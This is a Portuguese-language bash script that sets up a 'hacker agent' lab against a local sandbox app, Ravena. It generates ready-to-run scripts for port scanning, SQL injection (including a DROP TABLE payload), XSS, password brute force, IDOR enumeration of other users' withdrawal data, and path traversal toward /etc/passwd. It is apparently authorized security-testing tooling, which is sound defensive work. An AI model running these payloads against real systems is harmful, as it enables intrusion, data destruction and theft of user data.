#!/bin/bash
# ============================================
# LABORATÓRIO DO AGENTE HACKER
# Sandbox Ravena
# ============================================
# Este script configura o ambiente de laborário
# para o agente hacker executar testes reais
# usando ferramentas de sistema operacional.
# ============================================

echo "============================================"
echo "  LABORATÓRIO DO AGENTE HACKER"
echo "  Sandbox Ravena"
echo "============================================"
echo ""

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# ============================================
# VERIFICAÇÕES PRÉ-REQUISITOS
# ============================================

echo -e "${BLUE}[1/6]${NC} Verificando pré-requisitos..."

# Verificar se Docker está instalado
if ! command -v docker &> /dev/null; then
    echo -e "${RED}[ERRO]${NC} Docker não está instalado"
    exit 1
fi
echo -e "${GREEN}[OK]${NC} Docker encontrado"

# Verificar se Nmap está instalado
if ! command -v nmap &> /dev/null; then
    echo -e "${YELLOW}[AVISO]${NC} Nmap não encontrado - será instalado"
    apt-get update && apt-get install -y nmap 2>/dev/null || echo "Instale manualmente: nmap"
fi

# Verificar se cURL está instalado
if ! command -v curl &> /dev/null; then
    echo -e "${YELLOW}[AVISO]${NC} cURL não encontrado"
fi

echo ""

# ============================================
# CONFIGURAÇÃO DO AMBIENTE
# ============================================

echo -e "${BLUE}[2/6]${NC} Configurando ambiente..."

# Criar diretório de trabalho
LAB_DIR="$HOME/hacker-lab"
mkdir -p "$LAB_DIR"/{scans,logs,reports,tools}

# Criar arquivo de configuração
cat > "$LAB_DIR/config.env" << 'EOF'
# Configurações do Laboratório
SANDBOX_URL="http://localhost:8080"
SANDBOX_IP="172.20.0.2"  # IP do container ravena-app
DB_HOST="172.20.0.3"     # IP do container ravena-db
REDIS_HOST="172.20.0.4"  # IP do container ravena-redis

# Credenciais de teste (para exploração)
TEST_USER="attacker_001"
TEST_PASS="test123"
VICTIM_USER="vitima_001"
VICTIM_PASS="test123"

# Portas expostas
APP_PORT="8080"
DB_PORT="5432"
REDIS_PORT="6379"
NGINX_PORT="80"
EOF

echo -e "${GREEN}[OK]${NC} Ambiente configurado"

# ============================================
# FERRAMENTAS DO SISTEMA
# ============================================

echo -e "${BLUE}[3/6]${NC} Verificando ferramentas do sistema..."

echo "Ferramentas disponíveis:"
echo "  - nmap: Varredura de portas e serviços"
echo "  - curl: Requisições HTTP"
echo "  - netcat: Testes de conexão"
echo "  - python3: Scripts de automação"
echo "  - sqlmap: Testes de SQL Injection"
echo "  - nikto: Varredura web"
echo ""

# Verificar cada ferramenta
tools=("nmap" "curl" "python3" "netcat" "sqlmap" "nikto")
for tool in "${tools[@]}"; do
    if command -v $tool &> /dev/null; then
        echo -e "  ${GREEN}✓${NC} $tool"
    else
        echo -e "  ${RED}✗${NC} $tool (não instalado)"
    fi
done

echo ""

# ============================================
# SCRIPTS DE TESTE
# ============================================

echo -e "${BLUE}[4/6]${NC} Criando scripts de teste..."

# Script 1: Varredura de Portas
cat > "$LAB_DIR/01_port_scan.sh" << 'EOF'
#!/bin/bash
# Varredura de Portas - Sandbox Ravena

echo "============================================"
echo "  VARREDURA DE PORTAS"
echo "============================================"

TARGET="localhost"

echo "Alvo: $TARGET"
echo ""

# Varredura rápida
echo "1. Varredura rápida de portas principais..."
nmap -p 80,8080,5432,6379,3000,5601,9090,9200 $TARGET

echo ""

# Varredura detalhada
echo "2. Varredura detalhada com detecção de versão..."
nmap -sV -sC -p 80,8080,5432,6379 $TARGET

echo ""
echo "Scan concluído!"
EOF
chmod +x "$LAB_DIR/01_port_scan.sh"

# Script 2: Teste de SQL Injection
cat > "$LAB_DIR/02_sql_injection.sh" << 'EOF'
#!/bin/bash
# Teste de SQL Injection - Sandbox Ravena

echo "============================================"
echo "  TESTE DE SQL INJECTION"
echo "============================================"

TARGET="http://localhost:8080"

echo "Alvo: $TARGET/api/auth/login"
echo ""

# Payloads de SQL Injection
PAYLOADS=(
    "' OR 1=1--"
    "admin'--"
    "' UNION SELECT * FROM users--"
    "1' AND '1'='1"
    "'; DROP TABLE users--"
)

echo "Testando payloads..."
echo ""

for payload in "${PAYLOADS[@]}"; do
    echo "Payload: $payload"
    curl -s -X POST "$TARGET/api/auth/login" \
        -H "Content-Type: application/json" \
        -d "{\"username\": \"$payload\", \"password\": \"test\"}" \
        | python3 -m json.tool 2>/dev/null || echo "Resposta não é JSON"
    echo "---"
done

echo ""
echo "Teste concluído!"
EOF
chmod +x "$LAB_DIR/02_sql_injection.sh"

# Script 3: Teste de XSS
cat > "$LAB_DIR/03_xss_test.sh" << 'EOF'
#!/bin/bash
# Teste de XSS - Sandbox Ravena

echo "============================================"
echo "  TESTE DE XSS"
echo "============================================"

TARGET="http://localhost:8080"

echo "Alvo: $TARGET/api/auth/login"
echo ""

# Payloads de XSS
PAYLOADS=(
    "<script>alert('XSS')</script>"
    "javascript:alert(1)"
    "<img src=x onerror=alert(1)>"
    "<svg onload=alert(1)>"
)

echo "Testando payloads..."
echo ""

for payload in "${PAYLOADS[@]}"; do
    echo "Payload: $payload"
    curl -s -X POST "$TARGET/api/auth/login" \
        -H "Content-Type: application/json" \
        -d "{\"username\": \"$payload\", \"password\": \"test\"}" \
        | python3 -m json.tool 2>/dev/null || echo "Resposta não é JSON"
    echo "---"
done

echo ""
echo "Teste concluído!"
EOF
chmod +x "$LAB_DIR/03_xss_test.sh"

# Script 4: Teste de Brute Force
cat > "$LAB_DIR/04_brute_force.sh" << 'EOF'
#!/bin/bash
# Teste de Brute Force - Sandbox Ravena

echo "============================================"
echo "  TESTE DE BRUTE FORCE"
echo "============================================"

TARGET="http://localhost:8080"

echo "Alvo: $TARGET/api/auth/login"
echo "Usuário alvo: admin"
echo ""

# Senhas comuns
PASSWORDS=(
    "admin"
    "password"
    "123456"
    "admin123"
    "test"
    "root"
    "toor"
    "letmein"
    "welcome"
    "monkey"
)

echo "Testando senhas comuns..."
echo ""

for pass in "${PASSWORDS[@]}"; do
    echo "Tentando: admin / $pass"
    curl -s -X POST "$TARGET/api/auth/login" \
        -H "Content-Type: application/json" \
        -d "{\"username\": \"admin\", \"password\": \"$pass\"}" \
        | python3 -m json.tool 2>/dev/null || echo "Resposta não é JSON"
    echo "---"
done

echo ""
echo "Teste concluído!"
EOF
chmod +x "$LAB_DIR/04_brute_force.sh"

# Script 5: Teste de IDOR
cat > "$LAB_DIR/05_idor_test.sh" << 'EOF'
#!/bin/bash
# Teste de IDOR - Sandbox Ravena

echo "============================================"
echo "  TESTE DE IDOR"
echo "============================================"

TARGET="http://localhost:8080"

echo "Alvo: $TARGET/api"
echo ""

# Fazer login para obter token
echo "1. Obtendo token de sessão..."
LOGIN_RESPONSE=$(curl -s -X POST "$TARGET/api/auth/login" \
    -H "Content-Type: application/json" \
    -d '{"username": "attacker_001", "password": "test123"}')

TOKEN=$(echo $LOGIN_RESPONSE | python3 -c "import sys, json; print(json.load(sys.stdin).get('token', ''))" 2>/dev/null)

if [ -z "$TOKEN" ]; then
    echo "Não foi possível obter token"
    exit 1
fi

echo "Token obtido: ${TOKEN:0:20}..."
echo ""

# Testar IDOR - Tentar acessar dados de outro usuário
echo "2. Testando IDOR - Acessando dados de outros usuários..."
echo ""

# Tentar acessar saques de outros usuários
for user_id in 1 2 3 4 5; do
    echo "Tentando acessar dados do usuário $user_id..."
    curl -s -H "Authorization: Bearer $TOKEN" \
        "$TARGET/api/withdrawals/history?user_id=$user_id" \
        | python3 -m json.tool 2>/dev/null || echo "Acesso negado ou erro"
    echo "---"
done

echo ""
echo "Teste concluído!"
EOF
chmod +x "$LAB_DIR/05_idor_test.sh"

# Script 6: Teste de Path Traversal
cat > "$LAB_DIR/06_path_traversal.sh" << 'EOF'
#!/bin/bash
# Teste de Path Traversal - Sandbox Ravena

echo "============================================"
echo "  TESTE DE PATH TRAVERSAL"
echo "============================================"

TARGET="http://localhost:8080"

echo "Alvo: $TARGET"
echo ""

# Payloads de Path Traversal
PAYLOADS=(
    "../../../etc/passwd"
    "..\\..\\..\\windows\\system32"
    "%2e%2e%2f%2e%2e%2f"
    "....//....//....//etc/passwd"
    "..%252f..%252f..%252fetc/passwd"
)

echo "Testando payloads..."
echo ""

for payload in "${PAYLOADS[@]}"; do
    echo "Payload: $payload"
    curl -s "$TARGET/$payload" | head -20
    echo "---"
done

echo ""
echo "Teste concluído!"
EOF
chmod +x "$LAB_DIR/06_path_traversal.sh"

# Script 7: Análise de Resposta
cat > "$LAB_DIR/07_response_analysis.sh" << 'EOF'
#!/bin/bash
# Análise de Resposta - Sandbox Ravena

echo "============================================"
echo "  ANÁLISE DE RESPOSTA"
echo "============================================"

TARGET="http://localhost:8080"

echo "Analisando endpoints..."
echo ""

# Analisar headers de segurança
echo "1. Headers de segurança:"
curl -sI "$TARGET" | grep -i "x-frame-options\|x-content-type\|x-xss-protection\|content-security-policy"
echo ""

# Analisar endpoint de health
echo "2. Health check:"
curl -s "$TARGET/health" | python3 -m json.tool 2>/dev/null
echo ""

# Analisar resposta de erro
echo "3. Resposta de erro (endpoint inexistente):"
curl -s "$TARGET/api/naoexiste" | python3 -m json.tool 2>/dev/null || echo "404 ou outro erro"
echo ""

# Analisar tempo de resposta
echo "4. Tempo de resposta:"
curl -s -o /dev/null -w "Tempo total: %{time_total}s\n" "$TARGET/health"
echo ""

echo "Análise concluída!"
EOF
chmod +x "$LAB_DIR/07_response_analysis.sh"

# Script 8: Relatório de Testes
cat > "$LAB_DIR/08_generate_report.sh" << 'EOF'
#!/bin/bash
# Gerar Relatório de Testes - Sandbox Ravena

echo "============================================"
echo "  GERANDO RELATÓRIO DE TESTES"
echo "============================================"

REPORT_DIR="$HOME/hacker-lab/reports"
REPORT_FILE="$REPORT_DIR/report_$(date +%Y%m%d_%H%M%S).md"

mkdir -p "$REPORT_DIR"

cat > "$REPORT_FILE" << HEADER
# RELATÓRIO DE TESTES DE SEGURANÇA
**Data:** $(date)
**Alvo:** Sandbox Ravena
**Agente:** Hacker Lab

## Resumo
- Portas escaneadas
- Vulnerabilidades testadas
- Resultados coletados

## Testes Realizados

### 1. Varredura de Portas
$(./01_port_scan.sh 2>/dev/null)

### 2. SQL Injection
$(./02_sql_injection.sh 2>/dev/null | head -50)

### 3. XSS
$(./03_xss_test.sh 2>/dev/null | head -50)

### 4. Brute Force
$(./04_brute_force.sh 2>/dev/null | head -50)

### 5. IDOR
$(./05_idor_test.sh 2>/dev/null | head -50)

### 6. Path Traversal
$(./06_path_traversal.sh 2>/dev/null | head -50)

## Conclusões
[Preencher com base nos resultados]

## Recomendações
[Preencher com base nas vulnerabilidades encontradas]

---
Relatório gerado automaticamente
HEADER

echo "Relatório gerado: $REPORT_FILE"
echo ""
echo "============================================"
echo "  RELATÓRIO CONCLUÍDO"
echo "============================================"
EOF
chmod +x "$LAB_DIR/08_generate_report.sh"

echo -e "${GREEN}[OK]${NC} Scripts de teste criados"

# ============================================
# INSTRUÇÕES DE USO
# ============================================

echo -e "${BLUE}[5/6]${NC} Preparando instruções..."

cat > "$LAB_DIR/README.md" << 'EOF'
# LABORATÓRIO DO AGENTE HACKER

## Visão Geral
Este é o laboratório do agente hacker para testes de segurança na Sandbox Ravena.
O agente usa **ferramentas normais de sistema operacional** para executar testes.

## Ferramentas Disponíveis
- **nmap**: Varredura de portas e serviços
- **curl**: Requisições HTTP
- **python3**: Scripts de automação
- **netcat**: Testes de conexão
- **sqlmap**: SQL Injection automatizado
- **nikto**: Varredura web

## Como Usar

### 1. Navegar até o laboratório
```bash
cd ~/hacker-lab
```

### 2. Executar testes individualmente
```bash
./01_port_scan.sh      # Varredura de portas
./02_sql_injection.sh  # Teste de SQL Injection
./03_xss_test.sh       # Teste de XSS
./04_brute_force.sh    # Teste de Brute Force
./05_idor_test.sh      # Teste de IDOR
./06_path_traversal.sh # Teste de Path Traversal
./07_response_analysis.sh # Análise de resposta
```

### 3. Gerar relatório completo
```bash
./08_generate_report.sh
```

## Fluxo de Trabalho do Agente

```
1. Reconhecimento
   └─ ./01_port_scan.sh

2. Enumeração
   └─ ./07_response_analysis.sh

3. Exploração
   ├─ ./02_sql_injection.sh
   ├─ ./03_xss_test.sh
   ├─ ./04_brute_force.sh
   ├─ ./05_idor_test.sh
   └─ ./06_path_traversal.sh

4. Documentação
   └─ ./08_generate_report.sh
```

## Credenciais de Teste
- **Usuário:** attacker_001
- **Senha:** test123

## Alvos
- **App:** http://localhost:8080
- **Banco:** localhost:5432
- **Redis:** localhost:6379

## Nota Importante
Este laboratório é para **testes autorizados** apenas.
Use com responsabilidade e apenas em ambientes de teste.
EOF

echo -e "${GREEN}[OK]${NC} Instruções criadas"

# ============================================
# RESUMO FINAL
# ============================================

echo -e "${BLUE}[6/6]${NC} Resumo da instalação..."

echo ""
echo "============================================"
echo -e "${GREEN}  LABORATÓRIO INSTALADO COM SUCESSO${NC}"
echo "============================================"
echo ""
echo "Localização: $LAB_DIR"
echo ""
echo "Scripts disponíveis:"
echo "  01_port_scan.sh      - Varredura de portas"
echo "  02_sql_injection.sh  - Teste de SQL Injection"
echo "  03_xss_test.sh       - Teste de XSS"
echo "  04_brute_force.sh    - Teste de Brute Force"
echo "  05_idor_test.sh      - Teste de IDOR"
echo "  06_path_traversal.sh - Teste de Path Traversal"
echo "  07_response_analysis.sh - Análise de resposta"
echo "  08_generate_report.sh   - Gerar relatório"
echo ""
echo "Para começar:"
echo "  cd $LAB_DIR"
echo "  ./01_port_scan.sh"
echo ""
echo "============================================"
